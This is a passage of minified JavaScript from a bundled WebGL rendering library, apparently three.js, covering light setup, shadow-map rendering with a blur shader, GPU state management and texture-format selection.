x=c[u];if(x.isDirectionalLight){const S=i.directional[d];S.direction.setFromMatrixPosition(x.matrixWorld),s.setFromMatrixPosition(x.target.matrixWorld),S.direction.sub(s),S.direction.transformDirection(g),d++}else if(x.isSpotLight){const S=i.spot[f];S.position.setFromMatrixPosition(x.matrixWorld),S.position.applyMatrix4(g),S.direction.setFromMatrixPosition(x.matrixWorld),s.setFromMatrixPosition(x.target.matrixWorld),S.direction.sub(s),S.direction.transformDirection(g),f++}else if(x.isRectAreaLight){const S=i.rectArea[y];S.position.setFromMatrixPosition(x.matrixWorld),S.position.applyMatrix4(g),a.identity(),r.copy(x.matrixWorld),r.premultiply(g),a.extractRotation(r),S.halfWidth.set(x.width*.5,0,0),S.halfHeight.set(0,x.height*.5,0),S.halfWidth.applyMatrix4(a),S.halfHeight.applyMatrix4(a),y++}else if(x.isPointLight){const S=i.point[p];S.position.setFromMatrixPosition(x.matrixWorld),S.position.applyMatrix4(g),p++}else if(x.isHemisphereLight){const S=i.hemi[_];S.direction.setFromMatrixPosition(x.matrixWorld),S.direction.transformDirection(g),_++}}}return{setup:o,setupView:l,state:i}}function sg(t){const e=new rC(t),n=[],i=[];function s(h){c.camera=h,n.length=0,i.length=0}function r(h){n.push(h)}function a(h){i.push(h)}function o(){e.setup(n)}function l(h){e.setupView(n,h)}const c={lightsArray:n,shadowsArray:i,camera:null,lights:e,transmissionRenderTarget:{}};return{init:s,state:c,setupLights:o,setupLightsView:l,pushLight:r,pushShadow:a}}function aC(t){let e=new WeakMap;function n(s,r=0){const a=e.get(s);let o;return a===void 0?(o=new sg(t),e.set(s,[o])):r>=a.length?(o=new sg(t),a.push(o)):o=a[r],o}function i(){e=new WeakMap}return{get:n,dispose:i}}const oC=`void main() {
	gl_Position = vec4( position, 1.0 );
}`,lC=`uniform sampler2D shadow_pass;
uniform vec2 resolution;
uniform float radius;
void main() {
	const float samples = float( VSM_SAMPLES );
	float mean = 0.0;
	float squared_mean = 0.0;
	float uvStride = samples <= 1.0 ? 0.0 : 2.0 / ( samples - 1.0 );
	float uvStart = samples <= 1.0 ? 0.0 : - 1.0;
	for ( float i = 0.0; i < samples; i ++ ) {
		float uvOffset = uvStart + i * uvStride;
		#ifdef HORIZONTAL_PASS
			vec2 distribution = texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( uvOffset, 0.0 ) * radius ) / resolution ).rg;
			mean += distribution.x;
			squared_mean += distribution.y * distribution.y + distribution.x * distribution.x;
		#else
			float depth = texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0, uvOffset ) * radius ) / resolution ).r;
			mean += depth;
			squared_mean += depth * depth;
		#endif
	}
	mean = mean / samples;
	squared_mean = squared_mean / samples;
	float std_dev = sqrt( max( 0.0, squared_mean - mean * mean ) );
	gl_FragColor = vec4( mean, std_dev, 0.0, 1.0 );
}`,cC=[new G(1,0,0),new G(-1,0,0),new G(0,1,0),new G(0,-1,0),new G(0,0,1),new G(0,0,-1)],uC=[new G(0,-1,0),new G(0,-1,0),new G(0,0,1),new G(0,0,-1),new G(0,-1,0),new G(0,-1,0)],rg=new St,la=new G,Mu=new G;function dC(t,e,n){let i=new Mp;const s=new Je,r=new Je,a=new bt,o=new bM,l=new SM,c={},h=n.maxTextureSize,d={[ds]:pn,[pn]:ds,[wi]:wi},p=new pi({defines:{VSM_SAMPLES:8},uniforms:{shadow_pass:{value:null},resolution:{value:new Je},radius:{value:4}},vertexShader:oC,fragmentShader:lC}),f=p.clone();f.defines.HORIZONTAL_PASS=1;const y=new Zn;y.setAttribute("position",new ui(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));const _=new In(y,p),g=this;this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=ll;let u=this.type;this.render=function(A,C,L){if(g.enabled===!1||g.autoUpdate===!1&&g.needsUpdate===!1||A.length===0)return;A.type===cw&&(Ie("WebGLShadowMap: PCFSoftShadowMap has been deprecated. Using PCFShadowMap instead."),A.type=ll);const w=t.getRenderTarget(),M=t.getActiveCubeFace(),k=t.getActiveMipmapLevel(),H=t.state;H.setBlending(Ci),H.buffers.depth.getReversed()===!0?H.buffers.color.setClear(0,0,0,0):H.buffers.color.setClear(1,1,1,1),H.buffers.depth.setTest(!0),H.setScissorTest(!1);const V=u!==this.type;V&&C.traverse(function(W){W.material&&(Array.isArray(W.material)?W.material.forEach(j=>j.needsUpdate=!0):W.material.needsUpdate=!0)});for(let W=0,j=A.length;W<j;W++){const X=A[W],D=X.shadow;if(D===void 0){Ie("WebGLShadowMap:",X,"has no shadow.");continue}if(D.autoUpdate===!1&&D.needsUpdate===!1)continue;s.copy(D.mapSize);const N=D.getFrameExtents();if(s.multiply(N),r.copy(D.mapSize),(s.x>h||s.y>h)&&(s.x>h&&(r.x=Math.floor(h/N.x),s.x=r.x*N.x,D.mapSize.x=r.x),s.y>h&&(r.y=Math.floor(h/N.y),s.y=r.y*N.y,D.mapSize.y=r.y)),D.map===null||V===!0){if(D.map!==null&&(D.map.depthTexture!==null&&(D.map.depthTexture.dispose(),D.map.depthTexture=null),D.map.dispose()),this.type===pa){if(X.isPointLight){Ie("WebGLShadowMap: VSM shadow maps are not supported for PointLights. Use PCF or BasicShadowMap instead.");continue}D.map=new ci(s.x,s.y,{format:Or,type:Ii,minFilter:qt,magFilter:qt,generateMipmaps:!1}),D.map.texture.name=X.name+".shadowMap",D.map.depthTexture=new $a(s.x,s.y,si),D.map.depthTexture.name=X.name+".shadowMapDepth",D.map.depthTexture.format=Di,D.map.depthTexture.compareFunction=null,D.map.depthTexture.minFilter=Bt,D.map.depthTexture.magFilter=Bt}else{X.isPointLight?(D.map=new hy(s.x),D.map.depthTexture=new yM(s.x,di)):(D.map=new ci(s.x,s.y),D.map.depthTexture=new $a(s.x,s.y,di)),D.map.depthTexture.name=X.name+".shadowMap",D.map.depthTexture.format=Di;const B=t.state.buffers.depth.getReversed();this.type===ll?(D.map.depthTexture.compareFunction=B?_p:xp,D.map.depthTexture.minFilter=qt,D.map.depthTexture.magFilter=qt):(D.map.depthTexture.compareFunction=null,D.map.depthTexture.minFilter=Bt,D.map.depthTexture.magFilter=Bt)}D.camera.updateProjectionMatrix()}const O=D.map.isWebGLCubeRenderTarget?6:1;for(let B=0;B<O;B++){if(D.map.isWebGLCubeRenderTarget)t.setRenderTarget(D.map,B),t.clear();else{B===0&&(t.setRenderTarget(D.map),t.clear());const J=D.getViewport(B);a.set(r.x*J.x,r.y*J.y,r.x*J.z,r.y*J.w),H.viewport(a)}if(X.isPointLight){const J=D.camera,oe=D.matrix,ge=X.distance||J.far;ge!==J.far&&(J.far=ge,J.updateProjectionMatrix()),la.setFromMatrixPosition(X.matrixWorld),J.position.copy(la),Mu.copy(J.position),Mu.add(cC[B]),J.up.copy(uC[B]),J.lookAt(Mu),J.updateMatrixWorld(),oe.makeTranslation(-la.x,-la.y,-la.z),rg.multiplyMatrices(J.projectionMatrix,J.matrixWorldInverse),D._frustum.setFromProjectionMatrix(rg,J.coordinateSystem,J.reversedDepth)}else D.updateMatrices(X);i=D.getFrustum(),S(C,L,D.camera,X,this.type)}D.isPointLightShadow!==!0&&this.type===pa&&v(D,L),D.needsUpdate=!1}u=this.type,g.needsUpdate=!1,t.setRenderTarget(w,M,k)};function v(A,C){const L=e.update(_);p.defines.VSM_SAMPLES!==A.blurSamples&&(p.defines.VSM_SAMPLES=A.blurSamples,f.defines.VSM_SAMPLES=A.blurSamples,p.needsUpdate=!0,f.needsUpdate=!0),A.mapPass===null&&(A.mapPass=new ci(s.x,s.y,{format:Or,type:Ii})),p.uniforms.shadow_pass.value=A.map.depthTexture,p.uniforms.resolution.value=A.mapSize,p.uniforms.radius.value=A.radius,t.setRenderTarget(A.mapPass),t.clear(),t.renderBufferDirect(C,null,L,p,_,null),f.uniforms.shadow_pass.value=A.mapPass.texture,f.uniforms.resolution.value=A.mapSize,f.uniforms.radius.value=A.radius,t.setRenderTarget(A.map),t.clear(),t.renderBufferDirect(C,null,L,f,_,null)}function x(A,C,L,w){let M=null;const k=L.isPointLight===!0?A.customDistanceMaterial:A.customDepthMaterial;if(k!==void 0)M=k;else if(M=L.isPointLight===!0?l:o,t.localClippingEnabled&&C.clipShadows===!0&&Array.isArray(C.clippingPlanes)&&C.clippingPlanes.length!==0||C.displacementMap&&C.displacementScale!==0||C.alphaMap&&C.alphaTest>0||C.map&&C.alphaTest>0||C.alphaToCoverage===!0){const H=M.uuid,V=C.uuid;let W=c[H];W===void 0&&(W={},c[H]=W);let j=W[V];j===void 0&&(j=M.clone(),W[V]=j,C.addEventListener("dispose",E)),M=j}if(M.visible=C.visible,M.wireframe=C.wireframe,w===pa?M.side=C.shadowSide!==null?C.shadowSide:C.side:M.side=C.shadowSide!==null?C.shadowSide:d[C.side],M.alphaMap=C.alphaMap,M.alphaTest=C.alphaToCoverage===!0?.5:C.alphaTest,M.map=C.map,M.clipShadows=C.clipShadows,M.clippingPlanes=C.clippingPlanes,M.clipIntersection=C.clipIntersection,M.displacementMap=C.displacementMap,M.displacementScale=C.displacementScale,M.displacementBias=C.displacementBias,M.wireframeLinewidth=C.wireframeLinewidth,M.linewidth=C.linewidth,L.isPointLight===!0&&M.isMeshDistanceMaterial===!0){const H=t.properties.get(M);H.light=L}return M}function S(A,C,L,w,M){if(A.visible===!1)return;if(A.layers.test(C.layers)&&(A.isMesh||A.isLine||A.isPoints)&&(A.castShadow||A.receiveShadow&&M===pa)&&(!A.frustumCulled||i.intersectsObject(A))){A.modelViewMatrix.multiplyMatrices(L.matrixWorldInverse,A.matrixWorld);const V=e.update(A),W=A.material;if(Array.isArray(W)){const j=V.groups;for(let X=0,D=j.length;X<D;X++){const N=j[X],O=W[N.materialIndex];if(O&&O.visible){const B=x(A,O,w,M);A.onBeforeShadow(t,A,C,L,V,B,N),t.renderBufferDirect(L,null,V,B,A,N),A.onAfterShadow(t,A,C,L,V,B,N)}}}else if(W.visible){const j=x(A,W,w,M);A.onBeforeShadow(t,A,C,L,V,j,null),t.renderBufferDirect(L,null,V,j,A,null),A.onAfterShadow(t,A,C,L,V,j,null)}}const H=A.children;for(let V=0,W=H.length;V<W;V++)S(H[V],C,L,w,M)}function E(A){A.target.removeEventListener("dispose",E);for(const L in c){const w=c[L],M=A.target.uuid;M in w&&(w[M].dispose(),delete w[M])}}}const hC={[Md]:Ed,[Td]:Rd,[Ad]:kd,[Dr]:Cd,[Ed]:Md,[Rd]:Td,[kd]:Ad,[Cd]:Dr};function pC(t,e){function n(){let I=!1;const me=new bt;let ae=null;const ve=new bt(0,0,0,0);return{setMask:function(ie){ae!==ie&&!I&&(t.colorMask(ie,ie,ie,ie),ae=ie)},setLocked:function(ie){I=ie},setClear:function(ie,ee,le,Ne,ct){ct===!0&&(ie*=Ne,ee*=Ne,le*=Ne),me.set(ie,ee,le,Ne),ve.equals(me)===!1&&(t.clearColor(ie,ee,le,Ne),ve.copy(me))},reset:function(){I=!1,ae=null,ve.set(-1,0,0,0)}}}function i(){let I=!1,me=!1,ae=null,ve=null,ie=null;return{setReversed:function(ee){if(me!==ee){const le=e.get("EXT_clip_control");ee?le.clipControlEXT(le.LOWER_LEFT_EXT,le.ZERO_TO_ONE_EXT):le.clipControlEXT(le.LOWER_LEFT_EXT,le.NEGATIVE_ONE_TO_ONE_EXT),me=ee;const Ne=ie;ie=null,this.setClear(Ne)}},getReversed:function(){return me},setTest:function(ee){ee?ne(t.DEPTH_TEST):_e(t.DEPTH_TEST)},setMask:function(ee){ae!==ee&&!I&&(t.depthMask(ee),ae=ee)},setFunc:function(ee){if(me&&(ee=hC[ee]),ve!==ee){switch(ee){case Md:t.depthFunc(t.NEVER);break;case Ed:t.depthFunc(t.ALWAYS);break;case Td:t.depthFunc(t.LESS);break;case Dr:t.depthFunc(t.LEQUAL);break;case Ad:t.depthFunc(t.EQUAL);break;case Cd:t.depthFunc(t.GEQUAL);break;case Rd:t.depthFunc(t.GREATER);break;case kd:t.depthFunc(t.NOTEQUAL);break;default:t.depthFunc(t.LEQUAL)}ve=ee}},setLocked:function(ee){I=ee},setClear:function(ee){ie!==ee&&(me&&(ee=1-ee),t.clearDepth(ee),ie=ee)},reset:function(){I=!1,ae=null,ve=null,ie=null,me=!1}}}function s(){let I=!1,me=null,ae=null,ve=null,ie=null,ee=null,le=null,Ne=null,ct=null;return{setTest:function(tt){I||(tt?ne(t.STENCIL_TEST):_e(t.STENCIL_TEST))},setMask:function(tt){me!==tt&&!I&&(t.stencilMask(tt),me=tt)},setFunc:function(tt,Jn,fi){(ae!==tt||ve!==Jn||ie!==fi)&&(t.stencilFunc(tt,Jn,fi),ae=tt,ve=Jn,ie=fi)},setOp:function(tt,Jn,fi){(ee!==tt||le!==Jn||Ne!==fi)&&(t.stencilOp(tt,Jn,fi),ee=tt,le=Jn,Ne=fi)},setLocked:function(tt){I=tt},setClear:function(tt){ct!==tt&&(t.clearStencil(tt),ct=tt)},reset:function(){I=!1,me=null,ae=null,ve=null,ie=null,ee=null,le=null,Ne=null,ct=null}}}const r=new n,a=new i,o=new s,l=new WeakMap,c=new WeakMap;let h={},d={},p=new WeakMap,f=[],y=null,_=!1,g=null,u=null,v=null,x=null,S=null,E=null,A=null,C=new Xe(0,0,0),L=0,w=!1,M=null,k=null,H=null,V=null,W=null;const j=t.getParameter(t.MAX_COMBINED_TEXTURE_IMAGE_UNITS);let X=!1,D=0;const N=t.getParameter(t.VERSION);N.indexOf("WebGL")!==-1?(D=parseFloat(/^WebGL (\d)/.exec(N)[1]),X=D>=1):N.indexOf("OpenGL ES")!==-1&&(D=parseFloat(/^OpenGL ES (\d)/.exec(N)[1]),X=D>=2);let O=null,B={};const J=t.getParameter(t.SCISSOR_BOX),oe=t.getParameter(t.VIEWPORT),ge=new bt().fromArray(J),ze=new bt().fromArray(oe);function Ye(I,me,ae,ve){const ie=new Uint8Array(4),ee=t.createTexture();t.bindTexture(I,ee),t.texParameteri(I,t.TEXTURE_MIN_FILTER,t.NEAREST),t.texParameteri(I,t.TEXTURE_MAG_FILTER,t.NEAREST);for(let le=0;le<ae;le++)I===t.TEXTURE_3D||I===t.TEXTURE_2D_ARRAY?t.texImage3D(me,0,t.RGBA,1,1,ve,0,t.RGBA,t.UNSIGNED_BYTE,ie):t.texImage2D(me+le,0,t.RGBA,1,1,0,t.RGBA,t.UNSIGNED_BYTE,ie);return ee}const Z={};Z[t.TEXTURE_2D]=Ye(t.TEXTURE_2D,t.TEXTURE_2D,1),Z[t.TEXTURE_CUBE_MAP]=Ye(t.TEXTURE_CUBE_MAP,t.TEXTURE_CUBE_MAP_POSITIVE_X,6),Z[t.TEXTURE_2D_ARRAY]=Ye(t.TEXTURE_2D_ARRAY,t.TEXTURE_2D_ARRAY,1,1),Z[t.TEXTURE_3D]=Ye(t.TEXTURE_3D,t.TEXTURE_3D,1,1),r.setClear(0,0,0,1),a.setClear(1),o.setClear(0),ne(t.DEPTH_TEST),a.setFunc(Dr),Fe(!1),Mt(cm),ne(t.CULL_FACE),et(Ci);function ne(I){h[I]!==!0&&(t.enable(I),h[I]=!0)}function _e(I){h[I]!==!1&&(t.disable(I),h[I]=!1)}function De(I,me){return d[I]!==me?(t.bindFramebuffer(I,me),d[I]=me,I===t.DRAW_FRAMEBUFFER&&(d[t.FRAMEBUFFER]=me),I===t.FRAMEBUFFER&&(d[t.DRAW_FRAMEBUFFER]=me),!0):!1}function we(I,me){let ae=f,ve=!1;if(I){ae=p.get(me),ae===void 0&&(ae=[],p.set(me,ae));const ie=I.textures;if(ae.length!==ie.length||ae[0]!==t.COLOR_ATTACHMENT0){for(let ee=0,le=ie.length;ee<le;ee++)ae[ee]=t.COLOR_ATTACHMENT0+ee;ae.length=ie.length,ve=!0}}else ae[0]!==t.BACK&&(ae[0]=t.BACK,ve=!0);ve&&t.drawBuffers(ae)}function $e(I){return y!==I?(t.useProgram(I),y=I,!0):!1}const Nt={[As]:t.FUNC_ADD,[dw]:t.FUNC_SUBTRACT,[hw]:t.FUNC_REVERSE_SUBTRACT};Nt[pw]=t.MIN,Nt[fw]=t.MAX;const We={[mw]:t.ZERO,[gw]:t.ONE,[vw]:t.SRC_COLOR,[Sd]:t.SRC_ALPHA,[ww]:t.SRC_ALPHA_SATURATE,[bw]:t.DST_COLOR,[xw]:t.DST_ALPHA,[yw]:t.ONE_MINUS_SRC_COLOR,[wd]:t.ONE_MINUS_SRC_ALPHA,[Sw]:t.ONE_MINUS_DST_COLOR,[_w]:t.ONE_MINUS_DST_ALPHA,[Mw]:t.CONSTANT_COLOR,[Ew]:t.ONE_MINUS_CONSTANT_COLOR,[Tw]:t.CONSTANT_ALPHA,[Aw]:t.ONE_MINUS_CONSTANT_ALPHA};function et(I,me,ae,ve,ie,ee,le,Ne,ct,tt){if(I===Ci){_===!0&&(_e(t.BLEND),_=!1);return}if(_===!1&&(ne(t.BLEND),_=!0),I!==uw){if(I!==g||tt!==w){if((u!==As||S!==As)&&(t.blendEquation(t.FUNC_ADD),u=As,S=As),tt)switch(I){case Tr:t.blendFuncSeparate(t.ONE,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA);break;case um:t.blendFunc(t.ONE,t.ONE);break;case dm:t.blendFuncSeparate(t.ZERO,t.ONE_MINUS_SRC_COLOR,t.ZERO,t.ONE);break;case hm:t.blendFuncSeparate(t.DST_COLOR,t.ONE_MINUS_SRC_ALPHA,t.ZERO,t.ONE);break;default:Ze("WebGLState: Invalid blending: ",I);break}else switch(I){case Tr:t.blendFuncSeparate(t.SRC_ALPHA,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA);break;case um:t.blendFuncSeparate(t.SRC_ALPHA,t.ONE,t.ONE,t.ONE);break;case dm:Ze("WebGLState: SubtractiveBlending requires material.premultipliedAlpha = true");break;case hm:Ze("WebGLState: MultiplyBlending requires material.premultipliedAlpha = true");break;default:Ze("WebGLState: Invalid blending: ",I);break}v=null,x=null,E=null,A=null,C.set(0,0,0),L=0,g=I,w=tt}return}ie=ie||me,ee=ee||ae,le=le||ve,(me!==u||ie!==S)&&(t.blendEquationSeparate(Nt[me],Nt[ie]),u=me,S=ie),(ae!==v||ve!==x||ee!==E||le!==A)&&(t.blendFuncSeparate(We[ae],We[ve],We[ee],We[le]),v=ae,x=ve,E=ee,A=le),(Ne.equals(C)===!1||ct!==L)&&(t.blendColor(Ne.r,Ne.g,Ne.b,ct),C.copy(Ne),L=ct),g=I,w=!1}function at(I,me){I.side===wi?_e(t.CULL_FACE):ne(t.CULL_FACE);let ae=I.side===pn;me&&(ae=!ae),Fe(ae),I.blending===Tr&&I.transparent===!1?et(Ci):et(I.blending,I.blendEquation,I.blendSrc,I.blendDst,I.blendEquationAlpha,I.blendSrcAlpha,I.blendDstAlpha,I.blendColor,I.blendAlpha,I.premultipliedAlpha),a.setFunc(I.depthFunc),a.setTest(I.depthTest),a.setMask(I.depthWrite),r.setMask(I.colorWrite);const ve=I.stencilWrite;o.setTest(ve),ve&&(o.setMask(I.stencilWriteMask),o.setFunc(I.stencilFunc,I.stencilRef,I.stencilFuncMask),o.setOp(I.stencilFail,I.stencilZFail,I.stencilZPass)),Et(I.polygonOffset,I.polygonOffsetFactor,I.polygonOffsetUnits),I.alphaToCoverage===!0?ne(t.SAMPLE_ALPHA_TO_COVERAGE):_e(t.SAMPLE_ALPHA_TO_COVERAGE)}function Fe(I){M!==I&&(I?t.frontFace(t.CW):t.frontFace(t.CCW),M=I)}function Mt(I){I!==ow?(ne(t.CULL_FACE),I!==k&&(I===cm?t.cullFace(t.BACK):I===lw?t.cullFace(t.FRONT):t.cullFace(t.FRONT_AND_BACK))):_e(t.CULL_FACE),k=I}function P(I){I!==H&&(X&&t.lineWidth(I),H=I)}function Et(I,me,ae){I?(ne(t.POLYGON_OFFSET_FILL),(V!==me||W!==ae)&&(t.polygonOffset(me,ae),V=me,W=ae)):_e(t.POLYGON_OFFSET_FILL)}function Qe(I){I?ne(t.SCISSOR_TEST):_e(t.SCISSOR_TEST)}function lt(I){I===void 0&&(I=t.TEXTURE0+j-1),O!==I&&(t.activeTexture(I),O=I)}function Ee(I,me,ae){ae===void 0&&(O===null?ae=t.TEXTURE0+j-1:ae=O);let ve=B[ae];ve===void 0&&(ve={type:void 0,texture:void 0},B[ae]=ve),(ve.type!==I||ve.texture!==me)&&(O!==ae&&(t.activeTexture(ae),O=ae),t.bindTexture(I,me||Z[I]),ve.type=I,ve.texture=me)}function R(){const I=B[O];I!==void 0&&I.type!==void 0&&(t.bindTexture(I.type,null),I.type=void 0,I.texture=void 0)}function b(){try{t.compressedTexImage2D(...arguments)}catch(I){Ze("WebGLState:",I)}}function U(){try{t.compressedTexImage3D(...arguments)}catch(I){Ze("WebGLState:",I)}}function Q(){try{t.texSubImage2D(...arguments)}catch(I){Ze("WebGLState:",I)}}function te(){try{t.texSubImage3D(...arguments)}catch(I){Ze("WebGLState:",I)}}function K(){try{t.compressedTexSubImage2D(...arguments)}catch(I){Ze("WebGLState:",I)}}function Ae(){try{t.compressedTexSubImage3D(...arguments)}catch(I){Ze("WebGLState:",I)}}function ce(){try{t.texStorage2D(...arguments)}catch(I){Ze("WebGLState:",I)}}function Me(){try{t.texStorage3D(...arguments)}catch(I){Ze("WebGLState:",I)}}function Pe(){try{t.texImage2D(...arguments)}catch(I){Ze("WebGLState:",I)}}function re(){try{t.texImage3D(...arguments)}catch(I){Ze("WebGLState:",I)}}function de(I){ge.equals(I)===!1&&(t.scissor(I.x,I.y,I.z,I.w),ge.copy(I))}function Se(I){ze.equals(I)===!1&&(t.viewport(I.x,I.y,I.z,I.w),ze.copy(I))}function Te(I,me){let ae=c.get(me);ae===void 0&&(ae=new WeakMap,c.set(me,ae));let ve=ae.get(I);ve===void 0&&(ve=t.getUniformBlockIndex(me,I.name),ae.set(I,ve))}function ue(I,me){const ve=c.get(me).get(I);l.get(me)!==ve&&(t.uniformBlockBinding(me,ve,I.__bindingPointIndex),l.set(me,ve))}function Be(){t.disable(t.BLEND),t.disable(t.CULL_FACE),t.disable(t.DEPTH_TEST),t.disable(t.POLYGON_OFFSET_FILL),t.disable(t.SCISSOR_TEST),t.disable(t.STENCIL_TEST),t.disable(t.SAMPLE_ALPHA_TO_COVERAGE),t.blendEquation(t.FUNC_ADD),t.blendFunc(t.ONE,t.ZERO),t.blendFuncSeparate(t.ONE,t.ZERO,t.ONE,t.ZERO),t.blendColor(0,0,0,0),t.colorMask(!0,!0,!0,!0),t.clearColor(0,0,0,0),t.depthMask(!0),t.depthFunc(t.LESS),a.setReversed(!1),t.clearDepth(1),t.stencilMask(4294967295),t.stencilFunc(t.ALWAYS,0,4294967295),t.stencilOp(t.KEEP,t.KEEP,t.KEEP),t.clearStencil(0),t.cullFace(t.BACK),t.frontFace(t.CCW),t.polygonOffset(0,0),t.activeTexture(t.TEXTURE0),t.bindFramebuffer(t.FRAMEBUFFER,null),t.bindFramebuffer(t.DRAW_FRAMEBUFFER,null),t.bindFramebuffer(t.READ_FRAMEBUFFER,null),t.useProgram(null),t.lineWidth(1),t.scissor(0,0,t.canvas.width,t.canvas.height),t.viewport(0,0,t.canvas.width,t.canvas.height),h={},O=null,B={},d={},p=new WeakMap,f=[],y=null,_=!1,g=null,u=null,v=null,x=null,S=null,E=null,A=null,C=new Xe(0,0,0),L=0,w=!1,M=null,k=null,H=null,V=null,W=null,ge.set(0,0,t.canvas.width,t.canvas.height),ze.set(0,0,t.canvas.width,t.canvas.height),r.reset(),a.reset(),o.reset()}return{buffers:{color:r,depth:a,stencil:o},enable:ne,disable:_e,bindFramebuffer:De,drawBuffers:we,useProgram:$e,setBlending:et,setMaterial:at,setFlipSided:Fe,setCullFace:Mt,setLineWidth:P,setPolygonOffset:Et,setScissorTest:Qe,activeTexture:lt,bindTexture:Ee,unbindTexture:R,compressedTexImage2D:b,compressedTexImage3D:U,texImage2D:Pe,texImage3D:re,updateUBOMapping:Te,uniformBlockBinding:ue,texStorage2D:ce,texStorage3D:Me,texSubImage2D:Q,texSubImage3D:te,compressedTexSubImage2D:K,compressedTexSubImage3D:Ae,scissor:de,viewport:Se,reset:Be}}function fC(t,e,n,i,s,r,a){const o=e.has("WEBGL_multisampled_render_to_texture")?e.get("WEBGL_multisampled_render_to_texture"):null,l=typeof navigator>"u"?!1:/OculusBrowser/g.test(navigator.userAgent),c=new Je,h=new WeakMap;let d;const p=new WeakMap;let f=!1;try{f=typeof OffscreenCanvas<"u"&&new OffscreenCanvas(1,1).getContext("2d")!==null}catch{}function y(R,b){return f?new OffscreenCanvas(R,b):Vl("canvas")}function _(R,b,U){let Q=1;const te=Ee(R);if((te.width>U||te.height>U)&&(Q=U/Math.max(te.width,te.height)),Q<1)if(typeof HTMLImageElement<"u"&&R instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&R instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&R instanceof ImageBitmap||typeof VideoFrame<"u"&&R instanceof VideoFrame){const K=Math.floor(Q*te.width),Ae=Math.floor(Q*te.height);d===void 0&&(d=y(K,Ae));const ce=b?y(K,Ae):d;return ce.width=K,ce.height=Ae,ce.getContext("2d").drawImage(R,0,0,K,Ae),Ie("WebGLRenderer: Texture has been resized from ("+te.width+"x"+te.height+") to ("+K+"x"+Ae+")."),ce}else return"data"in R&&Ie("WebGLRenderer: Image in DataTexture is too big ("+te.width+"x"+te.height+")."),R;return R}function g(R){return R.generateMipmaps}function u(R){t.generateMipmap(R)}function v(R){return R.isWebGLCubeRenderTarget?t.TEXTURE_CUBE_MAP:R.isWebGL3DRenderTarget?t.TEXTURE_3D:R.isWebGLArrayRenderTarget||R.isCompressedArrayTexture?t.TEXTURE_2D_ARRAY:t.TEXTURE_2D}function x(R,b,U,Q,te=!1){if(R!==null){if(t[R]!==void 0)return t[R];Ie("WebGLRenderer: Attempt to use non-existing WebGL internal format '"+R+"'")}let K=b;if(b===t.RED&&(U===t.FLOAT&&(K=t.R32F),U===t.HALF_FLOAT&&(K=t.R16F),U===t.UNSIGNED_BYTE&&(K=t.R8)),b===t.RED_INTEGER&&(U===t.UNSIGNED_BYTE&&(K=t.R8UI),U===t.UNSIGNED_SHORT&&(K=t.R16UI),U===t.UNSIGNED_INT&&(K=t.R32UI),U===t.BYTE&&(K=t.R8I),U===t.SHORT&&(K=t.R16I),U===t.INT&&(K=t.R32I)),b===t.RG&&(U===t.FLOAT&&(K=t.RG32F),U===t.HALF_FLOAT&&(K=t.RG16F),U===t.UNSIGNED_BYTE&&(K=t.RG8)),b===t.RG_INTEGER&&(U===t.UNSIGNED_BYTE&&(K=t.RG8UI),U===t.UNSIGNED_SHORT&&(K=t.RG16UI),U===t.UNSIGNED_INT&&(K=t.RG32UI),U===t.BYTE&&(K=t.RG8I),U===t.SHORT&&(K=t.RG16I),U===t.INT&&(K=t.RG32I)),b===t.RGB_INTEGER&&(U===t.UNSIGNED_BYTE&&(K=t.RGB8UI),U===t.UNSIGNED_SHORT&&(K=t.RGB16UI),U===t.UNSIGNED_INT&&(K=t.RGB32UI),U===t.BYTE&&(K=t.RGB8I),U===t.SHORT&&(K=t.RGB16I),U===t.INT&&(K=t.RGB32I)),b===t.RGBA_INTEGER&&(U===t.UNSIGNED_BYTE&&(K=t.RGBA8UI),U===t.UNSIGNED_SHORT&&(K=t.RGBA16UI),U===t.UNSIGNED_INT&&(K=t.RGBA32UI),U===t.BYTE&&(K=t.RGBA8I),U===t.SHORT&&(K=t.RGBA16I),U===t.INT&&(K=t.RGBA32I)),b===t.RGB&&(U===t.UNSIGNED_INT_5_9_9_9_REV&&(K=t.RGB9_E5),U===t.UNSIGNED_INT_10F_11F_11F_REV&&(K=t.R11F_G11F_B10F)),b===t.RGBA){const Ae=te?Bl:je.getTransfer(Q);U===t.FLOAT&&(K=t.RGBA32F),U===t.HALF_FLOAT&&(K=t.RGBA16F),U===t.UNSIGNED_BYTE&&(K=Ae===it?t.SRGB8_ALPHA8:t.RGBA8),U===t.UNSIGNED_SHORT_4_4_4_4&&(K=t.RGBA4),U===t.UNSIGNED_SHORT_5_5_5_1&&(K=t.RGB5_A1)}return(K===t.R16F||K===t.R32F||K===t.RG16F||K===t.RG32F||K===t.RGBA16F||K===t.RGBA32F)&&e.get("EXT_color_buffer_float"),K}function S(R,b){let U;return R?b===null||b===di||b===qa?U=t.DEPTH24_STENCIL8:b===si?U=t.DEPTH32F_STENCIL8:b===Xa&&(U=t.DEPTH24_STENCIL8,Ie("DepthTexture: 16 bit depth attachment is not supported with stencil. Using 24-bit attachment.")):b===null||b===di||b===qa?U=t.DEPTH_COMPONENT24:b===si?U=t.DEPTH_COMPONENT32F:b===Xa&&(U=t.DEPTH_COMPONENT16),U}function E(R,b){return g(R)===!0||R.isFramebufferTexture&&R.minFilter!==Bt&&R.minFilter!==qt?Math.log2(Math.max(b.width,b.height))+1:R.mipmaps!==void 0&&R.mipmaps.length>0?R.mipmaps.length:R.isCompressedTexture&&Array.isArray(R.image)?b.mipmaps.length:1}function A(R){const b=R.target;b.removeEventListener("dispose",A),L(b),b.isVideoTexture&&h.delete(b)}function C(R){const b=R.target;b.removeEventListener("dispose",C),M(b)}function L(R){const b=i.get(R);if(b.__webglInit===void 0)return;const U=R.source,Q=p.get(U);if(Q){const te=Q[b.__cacheKey];te.usedTimes--,te.usedTimes===0&&w(R),Object.keys(Q).length===0&&p.delete(U)}i.remove(R)}function w(R){const b=i.get(R);t.deleteTexture(b.__webglTexture);const U=R.source,Q=p.get(U);delete Q[b.__cacheKey],a.memory.textures--}function M(R){const 